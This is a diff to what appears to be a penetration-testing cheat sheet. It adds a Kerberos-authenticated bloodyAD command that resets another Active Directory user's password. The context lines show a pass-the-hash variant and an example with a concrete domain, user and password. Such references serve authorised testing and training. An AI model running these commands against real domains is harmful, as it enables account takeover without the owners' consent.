@@ -25,6 +25,11 @@ bloodyAD -d object.local -u oliver -p 'c1cdfun_d2434' --host jenkins.object.loca
 bloodyAD -d <DOMAIN> -u '<USER>' -p ':<HASH>' -f rc4 --host <DC> set password '<TARGET_USER>' '<NEW_PASSWORD>'
 ```
 
+```console
+# Kerberos
+bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> set password '<TARGET_USER>' '<NEW_PASSWORD>'
+```
+
 <small>*Ref: [bloodyAD](https://github.com/CravateRouge/bloodyAD)*</small>
 
 {{< /tabcontent >}}
